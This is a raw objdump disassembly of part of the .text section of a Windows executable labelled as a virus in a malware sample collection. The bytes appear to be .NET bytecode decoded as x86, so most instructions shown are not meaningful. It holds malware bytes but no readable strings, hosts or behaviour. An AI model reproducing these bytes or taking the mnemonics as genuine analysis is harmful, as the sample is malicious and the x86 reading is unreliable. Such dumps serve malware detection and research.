
malware_samples/virus/068c5eefd8ecfbbb6dc2ee4e50b6b8faee42ad15aeb8c528e9bebd7b3e9c9f65.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b0 c7                	mov    $0xc7,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 88 6d 00 00 03    	add    %cl,0x300006d(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	20 26                	and    %ah,(%esi)
  4021d1:	00 70 7e             	add    %dh,0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 d4 21 00       	and    $0x21d472,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 cc                	jb     0x4021c2
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 d4 21 00       	and    $0x21d472,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 de                	jb     0x402204
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 de 26 00       	and    $0x26de72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 ce             	add    %dh,-0x32(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
